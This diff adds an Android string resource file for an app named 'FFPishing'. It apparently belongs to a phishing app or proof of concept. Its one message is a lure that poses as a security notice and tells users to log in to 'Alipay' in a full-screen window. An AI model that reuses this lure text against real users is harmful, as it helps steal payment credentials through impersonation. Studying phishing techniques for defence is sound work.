@@ -1,0 +1,4 @@
+<resources>
+    <string name="app_name">FFPishing</string>
+    <string name="toast_text">For security reasons, Please use \n full-screen window to log in to \"Alipay\" </string>
+</resources>
